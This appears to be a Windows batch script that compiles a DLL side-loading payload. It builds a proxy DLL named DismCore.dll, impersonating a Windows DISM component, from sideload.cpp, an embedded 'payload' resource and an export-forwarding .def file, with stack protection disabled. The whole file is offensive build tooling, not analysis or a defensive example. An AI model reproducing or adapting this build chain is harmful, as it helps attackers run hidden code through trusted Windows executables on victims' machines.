@echo off
setlocal enabledelayedexpansion
set "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
for /f "usebackq tokens=*" %%i in (`"%VSWHERE%" -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath`) do set "VSPATH=%%i"
call "!VSPATH!\VC\Auxiliary\Build\vcvars64.bat" >nul

rc.exe /nologo payload.rc
if errorlevel 1 exit /b 1

set "DLLNAME=DismCore.dll"

cl.exe /nologo /LD /O2 /GS- /DNDEBUG /MT /std:c++17 /EHsc ^
       sideload.cpp payload.res ^
       /link /DLL /DEF:proxy.def ^
       /OUT:%DLLNAME% ^
       kernel32.lib user32.lib shell32.lib advapi32.lib
if errorlevel 1 exit /b 1

del /q *.obj *.res *.exp *.lib 2>nul
echo [+] %DLLNAME% gerada